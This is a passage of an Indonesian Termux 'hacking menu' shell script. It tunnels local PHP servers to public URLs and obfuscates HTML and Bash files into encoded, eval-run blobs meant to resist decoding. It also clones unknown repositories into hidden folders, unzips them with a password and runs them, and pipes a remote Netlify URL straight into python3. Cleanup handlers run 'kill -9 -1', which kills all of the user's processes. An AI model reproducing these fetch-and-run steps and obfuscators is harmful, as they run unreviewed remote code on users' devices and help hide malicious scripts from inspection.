⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⣰⡶⠶⠶⠶⠶⠶⣶⡄⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⠀⢠⣿⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠸⣿⠀⠀⠀⠀⢸⡿⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣤⣤⣤⣤⣼⣿⣷⣀⣀⣾⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
echo -e "${g}  Development ${r}: ${c}Thxyzz404"
echo -e "${y}"
read -p "  Masukkan Port ===> : " isi
clear
neofetch --ascii_distro kali
echo ""
echo -e "${c}Port Yang Anda Masukkan :${n} $isi"
echo ""
echo -e "${r}Link di bawah silakan copy dan gunakan : "
echo -e "${n}"
ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:$isi serveo.net 2>/dev/null
}
url_2() {
clear 
cd $HOME
echo "
░█▀▀░█▀▀░▀█▀░█▄█░░░░░█▀█░█▀▄░█▀█░▀█▀
░█░░░▀▀█░░█░░█░█░▄▄▄░█▀▀░█▀▄░█░█░░█░
░▀▀▀░▀▀▀░░▀░░▀░▀░░░░░▀░░░▀░▀░▀▀▀░░▀░ " | lolcat
echo ""
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo ""
read -p "$(echo -e "${y}Masukkan Port Anda ${r}[ ${g}contoh : 8080 ${r}]${c} : ")" p
echo ""
p=${p:-8080}
php -S 127.0.0.1:$p >/dev/null 2>&1 &
php_pid=$!
cleanup() {
    clear 
    echo ""
    echo -e "${r}Program dihentikan. Menutup server..!!"
    echo ""
    kill $php_pid 2>/dev/null
    sleep 2 
    kill -9 -1 && exit
}
trap cleanup SIGINT SIGTERM
echo -e "${r}[ ${g}✓ ${r}]${c} Menunggu link..!!"
ssh -o StrictHostKeyChecking=no -R 80:localhost:$p nokey@localhost.run 2>/dev/null | while IFS= read -r line; do
    if [[ $line =~ tunneled\ with\ tls\ termination,\ (https://)?([^ ]*) ]]; then
        hostname="${BASH_REMATCH[2]}"
        echo ""
        echo -e "${g}Link anda : ${c}$hostname"
        echo ""
        echo -e "${r}Tekan CTRL+C untuk menghentikan."
    fi
done
}
url_3() {
clear 
cd $HOME
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
n='\033[0m'
cok="ansi-rounded"
ngrok="$HOME/ngrok"
install_ngrok() {
    echo ""
    echo -e "${r}[ ${g}++ ${r}]${c} MENGINSTAL NGROK VERSI TERBARU..!!"
    sleep 2
    cd $HOME
    rm -rf ngrok
    mkdir -p ngrok
    cd ngrok
    curl -LO https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
    tar -xzf ngrok-v3-stable-linux-arm64.tgz
    rm ngrok-v3-stable-linux-arm64.tgz
    chmod +x ngrok
    clear
    cowsay -f eyes "By.Thxyzz404" | boxes -d "$cok" | lolcat
    echo -e "${y}"
    read -p "Masukkan AuthToken Ngrok Anda : " tokenlu
    ./ngrok config add-authtoken $tokenlu
    clear
    echo -e "${bold_bg}${bold_gren} NGROK SUDAH TERINSTAL DENGAN VERSI TERBARU ${n}"
    sleep 2
}
if [ -d "$ngrok" ] && [ -f "$ngrok/ngrok" ]; then
    cd $ngrok
    versi_ngrok=$(./ngrok version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    if [ -z "$versi_ngrok" ] || [ "$(printf '%s\n' "3.20.0" "$versi_ngrok" | sort -V | head -n1)" != "3.20.0" ]; then
        echo -e "${r}[ ! ] Versi ngrok terlalu lama atau error. Mengupdate.${n}"
        install_ngrok
        cd $ngrok
    fi
    clear
    cowsay -f eyes "By.Thxyzz404" | boxes -d "$cok" | lolcat
    echo ""
    echo -e "${r}[ ${g}?? ${r}]${y} Pilih mthode ${r}[ ${g}http ${r}]"
    echo -e "${g}"
    read -p "localhost input mthode [ http ] : " manakocak
    clear
    cowsay -f eyes "By.Thxyzz404" | boxes -d "$cok" | lolcat
    echo ""
    echo -e "${r}[ ${g}?? ${r}]${c} Masukkan prot anda bebas ${r}[ ${g}contoh : 8080 ${r}]"
    echo -e "${c}"
    read -p "localhost input mthode : " port
    clear
    echo "
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⣰⡶⠶⠶⠶⠶⠶⣶⡄⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⠀⢠⣿⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠸⣿⠀⠀⠀⠀⢸⡿⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣤⣤⣤⣤⣼⣿⣷⣀⣀⣾⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | boxes -d "$cok" | lolcat
    echo ""
    echo -e "${bold_bg}${bold_gren} NYALAKAN DULU HOTSPOT ANDA ${n}"
    echo -e "${g}"
    read -p "TEKAN ENTER UNTUK MEMULAI"
    ./ngrok $manakocak $port
else
    install_ngrok
    exec "$0"
fi
}
url_4() {
clear 
cd $HOME
echo ""
echo -e "${g} Sedang Menginstall Package..!!"
sleep 2
echo -e "${c}"
pkg update && pkg install cloudflared
clear
echo ""
echo -e "${r} Package Telah Di Install Menjalankan Program..!!"
sleep 3
clear
cd $HOME
echo "
 ▗▄▄▖▗▖    ▗▄▖ ▗▖ ▗▖▗▄▄▄ ▗▄▄▖ ▗▄▄▄▖▗▄▄▄ 
▐▌   ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌  █▐▌ ▐▌▐▌   ▐▌  █
▐▌   ▐▌   ▐▛▀▜▌▐▌ ▐▌▐▌  █▐▛▀▚▖▐▛▀▀▘▐▌  █
▝▚▄▄▖▐▙▄▄▖▐▌ ▐▌▝▚▄▞▘▐▙▄▄▀▐▌ ▐▌▐▌   ▐▙▄▄▀
        Developer : Thxyzz404
 " | lolcat 
clauderfred_thxyzz404() {
  echo ""
  read -p "$(echo -e "${y}Masukkan Port Yang Ingin Anda Gunakan ${r}[ ${g}Misall 8080 ${r}]${c} : ")" port
  echo ""
  echo -e "${r}[ ${g}• ${r}]${c} Menjalankan Server PHP Lokal Di Port $port..!!"
  echo ""
  php -S localhost:$port > /dev/null 2>&1 &
  sleep 3
  echo -e "${r}[ ${g}• ${r}]${c} Membuat Link Publik Dari Cloudflared..!!"
  echo ""
  cloudflared tunnel --url http://localhost:$port --protocol http2 > sendlink 2>&1 &
  sleep 8
  link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" sendlink)
  if [ -n "$link" ]; then
    echo -e "${r}[ ${g}✓ ${r}]${c} Link Clauderfred Anda ${g}: ${y}$link"
    echo ""
  else
    echo ""
    echo -e "${g}[ ${r}X ${g}]${y} Gagall Membuat Link. Pastikan Cloudflared Terinstal Dengan Benar..!!"
    echo ""
  fi
}
clauderfred_thxyzz404
}
about() {
echo -e "${g} Thanks you by.thxyzz404"
echo ""
}
start() {
    clear
    mek
    echo ""
    read -p "$(echo -e "${b}Choose${c} :${g} ")" choose
    echo ""
    case "$choose" in
        1|01) url_1 ;;
        2|02) url_2 ;;
        3|03) url_3 ;;
        4|04) url_4 ;;
        5|05) about ;;
        *) echo -e "${r}Invalid__Option..!!${n}" ;;
    esac
    echo ""
}
start
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
     ;;
       53)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
SAVE_DIR="/sdcard/ENCRIPSI_HTML"
g='\033[32;1m'
r='\033[31;1m'
c='\033[36;1m'
y='\033[33;1m'
p='\033[35;1m'
show_loading() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}
thxyzz404() {
    local content="$1"
    python3 -c "
import sys
content = sys.stdin.read()
print('<!DOCTYPE html><html><head><meta charset=\"utf-8\"></head><body><script>')
print('const アイエトゥクスプフグウォ=[' + ','.join(str(ord(c)) for c in content) + '];')
print('document.write(アイエトゥクスプフグウォ.map(c => String.fromCharCode(c)).join(\"\")')
print(');</script></body></html>')
    "
}
thyzz404() {
echo "
░█▀█░█▀▄░█▀▀░░░░░█░█░▀█▀░█▄█░█░░
░█░█░█▀▄░█▀▀░▄▄▄░█▀█░░█░░█░█░█░░
░▀▀▀░▀▀░░▀░░░░░░░▀░▀░░▀░░▀░▀░▀▀▀ " | lolcat 
    echo ""
    echo -e "${p}    Development ${g}: ${c}Thxyzz404"
    echo ""
    echo -e "${g}Contoh input pengguna : /sdcard/Folder/File_Tujuan.py "
    echo ""
    echo -e "${y}"
    read -p "Masukkan file path HTML : " anomali
    echo ""    
    if [ ! -f "$anomali" ]; then
        clear 
        echo ""
        echo -e "${r} File html tidak di temukan bg."
        echo ""
        return
    fi   
    mek="${anomali##*.}"
    if [[ "$mek" != "html" && "$mek" != "htm" ]]; then
        clear 
        echo ""
        echo -e "${y} File berformat harus html bg."
        echo ""
        return
    fi    
    file_bsr=$(stat -f%z "$anomali" 2>/dev/null || stat -c%s "$anomali" 2>/dev/null)
    if [ "$file_bsr" -gt 1000000 ]; then
        echo ""
        echo -e "${c} File ini besar memproses : [ $((file_bsr/1024)) KB ] "
        echo ""
    fi   
    echo -e "${r}[ ${g}✓ ${r}]${y} File terbaca : $(basename "$anomali")"
    mkdir -p "$SAVE_DIR"    
    output_file="$SAVE_DIR/obf_$(basename "$anomali")"   
    (
        content=$(cat "$anomali")
        final=$(echo "$content" | thxyzz404)
        echo "$final" > "$output_file"
    ) &
    show_loading $!
    wait $!    
    if [ -f "$output_file" ]; then
        out_size=$(stat -f%z "$output_file" 2>/dev/null || stat -c%s "$output_file" 2>/dev/null)
        echo ""
        echo -e "${c}=================================="
        echo ""
        echo -e "${g} • Ukuran asli : $file_bsr bytes"
        echo -e " • Ukuran hasil : $out_size bytes"
        if [ "$file_bsr" -gt 0 ]; then
            rasio=$(( (out_size * 100) / file_bsr ))
            echo -e " • Rasio : ${rasio}% "
        else
            echo -e " • Rasio : Tidak dapat dihitung (file kosong)"
        fi     
        echo ""
        echo -e "${c}=================================="
        echo ""
        echo -e "${g} • Lokasi penyimpanan : $output_file"
        echo ""
    else
        echo ""
        clear
        echo -e "${r} Terjadi kesalahan membuat file output."
        echo ""
    fi
}
thyzz404
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
  clear
    ;;
        30) 
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear 
r='\033[1;31m'
g='\033[1;32m'
y='\033[1;33m'
c='\033[1;36m'
n='\033[0m'
install_package() {
    local pkg="$1"
    if command -v "$pkg" >/dev/null 2>&1; then
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} $pkg sudah terinstall..!!"
        sleep 2
        echo ""
    else
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} $pkg belum terinstall, sedang menginstall..!!"
        sleep 2
        echo -e "${n}"
        apt-get install -y "$pkg"
    fi
}
install_pip_package() {
    local pkg="$1"
    if pip show "$pkg" >/dev/null 2>&1; then
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} $pkg (pip) sudah terinstall..!!"
        sleep 2
        echo ""
    else
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} $pkg (pip) belum terinstall, sedang menginstall..!!"
        sleep 2
        pip install "$pkg"
    fi
}
install_npm_package() {
    local pkg="$1"
    if npm list -g "$pkg" | grep "$pkg" >/dev/null 2>&1; then
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} $pkg (npm) sudah terinstall..!!"
        sleep 2
        echo ""
    else
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} $pkg (npm) belum terinstall, sedang menginstall..!!"
        sleep 1
        npm install -g "$pkg"
    fi
}
clear
echo ""
echo -e "${g}Memulai proses instalasi..!!"
sleep 2
clear
echo ""
echo -e "${c}Update dan upgrade system..!!"
echo -e "${n}"
apt-get update -y
apt-get upgrade -y
clear 
main_packages=(
    "python" "coreutils" "ncurses-utils" "python-pip" "nodejs" "bc" "ruby"
    "openssl-tool" "xz-utils" "bzip2" "boxes" "jq" "figlet" "toilet"
)
clear
echo ""
echo -e "${c}Menginstall packages utama..!!"
echo -e "${n}"
for pkg in "${main_packages[@]}"; do
    install_package "$pkg"
done
additional_packages=(
    "ossp-uuid" "vim" "tree" "cmake" "nodejs-lts"
    "clang" "make"
)
clear
echo ""
echo -e "${c}Menginstall packages tambahan..!!"
echo -e "${n}"
for pkg in "${additional_packages[@]}"; do
    install_package "$pkg"
done
clear
echo ""
echo -e "${c}Menginstall npm packages..!!"
echo -e "${n}"
install_npm_package "bash-obfuscate"
clear
echo ""
echo -e "${c}Menginstall Python packages..!!"
echo -e "${n}"
install_pip_package "rich"
install_pip_package "rich-cli"
clear
echo ""
echo -e "${g}Proses instalasi selesai!"
sleep 2 
clear 
echo ""
echo -e "${y}Membersihkan cache..!!"
echo -e "${n}"
apt-get autoremove -y
apt-get clean
clear
echo ""
echo -e "${c}Verifikasi instalasi${n}"
echo "=========================="
echo -e "${g}"
tools=("python" "node" "npm" "pip" "vim" "clang")
for tool in "${tools[@]}"; do
    if command -v "$tool" >/dev/null 2>&1; then
        echo -e "${g}✓ $tool berhasil diinstall${n}"
    else
        echo -e "${r}✗ $tool gagal diinstall${n}"
    fi
done
echo ""
echo -e "${r}Semua package telah berhasil diinstall!"
echo ""
sleep 4 
clear 
echo ""
echo -e "${g} Membuka fitur create botz telegram..!!"
echo ""
xdg-open https://t.me/BotFather
sleep 4
clear 
echo ""
echo -e "${r} PERINGATAN IKUTI LANGKAH-LANGKAH TERSEBUT."
echo ""
echo ""
echo -e "${r}[ ${g}1. ${r}]${c} Pilih menu ${g}: ${y}/start"
echo -e "${r}[ ${g}2. ${r}]${c} Pilih menu ${g}: ${y}/newbot"
echo -e "${r}[ ${g}3. ${r}]${c} Masukkan printah ${g}: ${y}Namabotzlu_bot"
echo -e "${r}[ ${g}4. ${r}]${c} Harus di awali nama botz ${r}[ ${g}_bot ${r}]"
echo -e "${r}[ ${g}5. ${r}]${c} Terakhir cek ID botz di ${g}: ${r}@CekIDTelegram_bot"
echo ""
echo -e "${g}Tekan Enter Untuk Melanjutkannya."
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
ANK_IDIOT="$HOME/Bacot_Ajg"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Gagal masuk ke direktori : $ANK_IDIOT"
    if [ -f "Cok.sh" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        bash Cok.sh || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} File tidak ada, mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/Bacot_Ajg || kontol "Gagal cloning repository"
        cd "$ANK_IDIOT" || kontol "Gagal masuk ke direktori github."
        bash Cok.sh || kontol "Terjadi kesalahan saat menjalankan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repository github..!!${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/Bacot_Ajg || kontol "Gagal cloning repository"    
    cd "$ANK_IDIOT" || kontol "Gagal masuk ke direktori github."
    bash Cok.sh || kontol "Terjadi kesalahan saat menjalankan."
fi
              echo ""
              echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
               ;;
        31)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.imei_temp"
PEJU="Imei.py"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        chmod +x Imei.py
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        unzip -o -P "Tolol_Pantau_Sc_Orang_Dongo" Cok.sh >/dev/null 2>&1 || kontol "Ada Maslah."
        chmod +x Imei.py
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    unzip -o -P "Tolol_Pantau_Sc_Orang_Dongo" Cok.sh >/dev/null 2>&1 || kontol "Ada Maslah."
    chmod +x Imei.py
    python3 "$PEJU" || kontol "Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      32)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear 
              echo ""
c="\033[36;1m"
y="\033[33;1m"
r="\033[31;1m"
g="\033[32;1m"
echo -e "${r}[ ${g}✓ ${r}]${c} Mengecek modul Python jika diperlukan..!!"
sleep 3 
declare -A modules=(
  ["requests"]="requests"
  ["urllib3"]="urllib3"
  ["PIL"]="Pillow"
  ["certifi"]="certifi"
  ["rich"]="rich"
)
echo ""
for mod in "${!modules[@]}"; do
  echo -e "${r}[ 🚨 ]${y} Mengecek modul '$mod'..!!"
  python -c "import $mod" 2>/dev/null
  if [ $? -ne 0 ]; then
    echo ""
    echo -e "${r}Belum terinstall. Menginstal '${modules[$mod]}'..!!"
    pip install "${modules[$mod]}"
  else
    echo ""
    echo -e "${g}Sudah terinstall."
    sleep 2 
    echo ""
  fi
done
clear
echo ""
echo -e "${g} Menjalankan Tools..!!"
echo ""
sleep 2
python3 <(curl -sL "https://shokhengkellupante.netlify.app")
              echo ""
              echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
               ;;
       54)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear 
SAVE_DIR="/sdcard/ENCRIPSI_BASH"
n='\033[0m'  
g='\033[1;32m'  
c='\033[1;36m'  
r='\033[1;31m'  
y='\033[1;33m'
echo "
╔╗ ┌─┐┌─┐┬ ┬   ╔═╗┬ ┬┌─┐┬  
╠╩╗├─┤└─┐├─┤───╚═╗├─┤├┤ │  
╚═╝┴ ┴└─┘┴ ┴   ╚═╝┴ ┴└─┘┴─┘" | lolcat
echo -e "${r} Development ${n}: ${y}Thxyzz404"
echo ""
echo -e "${c}Contoh input pengguna : /sdcard/Folder/File_Tujuan.py "
echo -e "${g}"
read -p "Masukkan path file : " file
echo -e "${y}"
read -p "Masukkan output file : " ou
mkdir -p "$SAVE_DIR"
ou="$SAVE_DIR/$ou"
if [ ! -f "$file" ]; then
    clear 
    echo ""
    echo -e "${r}Error : File '$file' tidak ditemukan!"
    echo ""
fi
dasar_banci=$(xxd -p "$file" | tr -d '\n')
cat > "$ou" << 'EOF'
set +H

_ank_ajg(){
  local x=$((RANDOM%9999))
  [ $x -eq 1337 ] && echo "Decoder_Goblok"
}
_ank_babi(){
  for i in {1..3}; do :; done
}
_ank_monyet(){
  false && exit 0
}
_ank_haram(){
  echo "Decoder_Goblok" > /dev/null
}
_ank_bego(){
  local y=$((RANDOM%100))
  [ $y -eq 50 ] && echo "Decoder_Goblok"
}
EOF
echo "__P__=\"$dasar_banci\"" >> "$ou"
cat >> "$ou" << 'EOF'
__run__(){
  eval "$(echo $__P__ | xxd -r -p)"
}
if [ "$RANDOM" -gt 99999 ]; then
  _ank_ajg
  _ank_haram
  _ank_bego
else
  _ank_monyet
  _ank_babi
fi
__run__
EOF
chmod +x "$ou"
echo ""
echo -e "${n}=========================================="
echo -e "${g}     Source berhasil di encripsi!"
echo -e "${c}     File terenkripsi ${y}: $ou"
echo -e "${n}=========================================="
       echo ""
              echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
                 ;;
      33)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
install_package() {
local pkg="$1"
if command -v "$pkg" >/dev/null 2>&1; then
    clear
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} $pkg sudah terinstall."
    sleep 2
    echo ""
else
    clear
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} $pkg sedang menginstall."
    sleep 2
    echo -e "${n}"
    apt-get install -y "$pkg"
fi
}
install_package "libspeedtest"
hide_cursor() {
tput civis
}
show_cursor() {
tput cnorm
}
cleanup() {
echo ""
echo -e "\033[31;1m Kluar dari Network."
echo ""
sleep 4
kill -9 -1 && exit
show_cursor
tput sgr0
}
trap cleanup SIGINT SIGTERM
hide_cursor
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣾⣿⣿⣿⣿⣷⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣶⣿⣿⠿⠛⠉⠉⠉⠀⠀⠉⠉⠉⠛⠿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⠟⠉⠀⠀⠀⠀⢀⣤⣤⣤⣀⠀⠀⠀⠀⠀⠉⠻⣿⣷⣄⠀⠀⠀
⠀⠀⣼⣿⡟⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣯⣢⡀⠀⠀⠀⠈⢻⣿⣧⠀⠀
⠀⣼⣿⡟⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣧⠀
⢸⣿⡟⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡇
⣾⣿⡇⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷
⣿⣿⡁⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿
⢿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⢸⣿⡿
⢸⣿⣧⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⣼⣿⡇
⠀⢻⣿⣧⠀⠀⠀⠀⠈⠋⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⣼⣿⡟⠀
⠀⠀⢻⣿⣧⡀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢀⣼⣿⡟⠀⠀
⠀⠀⠀⠙⢿⣿⣦⣀⠀⠀⢀⣼⠟⠙⠘⣿⣿⣿⣿⣿⣿⣿⠀⣴⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣦⣀⣀⣾⣁⡈⠛⢿⣿⣿⣿⡆⠹⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⢿⣿⣿⣿⣿⣆⠈⢻⣿⣿⣿⠀
=====================================
    MONITORING KECEPATAN INTERNET    
=====================================
     Tekan Ctrl+C untuk keluar
------------------------------------- " | lolcat
echo ""
tput sc
while true; do
tput rc
tput ed
cek=$(ping -c 1 8.8.8.8 2>/dev/null | grep -oP 'time=\K[0-9.]+' | head -1)
